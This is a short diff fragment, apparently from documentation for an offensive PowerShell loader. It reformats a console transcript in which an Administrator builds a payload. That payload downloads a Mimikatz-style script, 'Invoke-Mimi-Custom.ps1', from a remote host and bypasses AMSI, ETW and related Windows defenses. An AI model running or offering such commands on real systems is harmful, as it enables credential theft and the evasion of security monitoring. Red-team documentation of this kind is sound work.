@@ -112,8 +112,8 @@ AntispywareEnabled        : True
 
 PS C:\Users\Administrator\Desktop> . .\PowerLoaderCustom.ps1
 
-PS C:\Users\Administrator\Desktop> $payload0 = New-PowerLoader-Custom -Type PoSh -FileUrl "http://192.168.1.113:8081/Invoke-Mimi-Custom.ps1" -ArgumentList 'Invoke-Mimi-Custom' 
-                                   -Bypass AntiMSI,PML,SBL,ETW
+PS C:\Users\Administrator\Desktop> $payload0 = New-PowerLoader-Custom -Type PoSh -FileUrl "http://192.168.1.113:8081/Invoke-Mimi-Custom.ps1" 
+                                    -ArgumentList 'Invoke-Mimi-Custom' -Bypass AntiMSI,PML,SBL,ETW
 
 PS C:\Users\Administrator\Desktop> amsiscanbuffer
 At line:1 char:1
